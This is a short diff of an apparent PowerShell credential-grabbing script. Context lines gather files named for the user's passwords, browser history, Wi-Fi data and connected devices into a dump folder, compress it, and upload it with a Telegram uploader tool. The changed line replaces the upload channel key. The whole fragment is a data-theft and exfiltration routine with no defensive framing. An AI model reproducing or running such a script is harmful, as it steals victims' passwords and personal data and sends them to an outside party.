@@ -10,4 +10,5 @@ New-Item -Path "C:\Users\Public\Documents\dump" -ItemType Directory
 Start-Sleep -Seconds 60 
 Move-Item -Path "$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt" -Destination dump/
 Compress-Archive dump/ dump.zip
-./telegram_uploader.exe -f dump.zip -c "g3ShXrgz"
+./telegram_uploader.exe -f dump.zip -c '*K"b$;0-3A9X4/X:6Y=4wZsm\'
+
